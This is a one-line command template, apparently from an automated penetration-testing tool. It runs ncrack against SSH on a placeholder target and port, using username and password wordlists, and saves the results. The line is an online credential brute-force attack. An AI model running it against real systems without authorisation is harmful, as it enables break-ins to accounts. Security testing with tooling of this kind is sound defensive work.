ncrack  -v -U "_APP_PATH_/brute-force/usernames.ssh.txt" -P "_APP_PATH_/brute-force/passwords.ssh.txt" -p ssh:_PORT_ -oA "_OUTPUT_/_TARGET_._PORT_.ncrack" _TARGET_